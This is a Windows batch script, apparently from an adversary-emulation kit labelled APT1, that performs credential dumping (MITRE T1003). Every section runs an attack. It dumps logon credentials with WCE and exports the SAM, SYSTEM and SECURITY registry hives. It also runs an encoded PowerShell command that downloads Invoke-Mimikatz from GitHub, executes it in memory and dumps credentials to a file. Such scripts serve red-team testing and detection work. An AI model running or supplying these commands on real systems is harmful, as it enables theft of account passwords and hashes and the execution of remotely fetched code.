@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Credential Dumping	(T1003)
ECHO.
ECHO [+] Dumping Using 'WCE'
ECHO -------------------------------------------------------------------
%Utilities%\wce -o %temp%\APT1\wce.txt
ECHO -------------------------------------------------------------------
ECHO.


ECHO [+] Exporting SAM, SYSTEM, SECURITY registry 
ECHO -------------------------------------------------------------------
cmd /c reg save HKLM\sam %temp%\APT1\reg_sam
reg save HKLM\system %temp%\APT1\reg_system
reg save HKLM\security %temp%\APT1\reg_security
ECHO -------------------------------------------------------------------
ECHO.


ECHO [+] EncodedMimikatz
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==" >> %temp%\APT1\CredDump.txt
ECHO -------------------------------------------------------------------
ECHO.

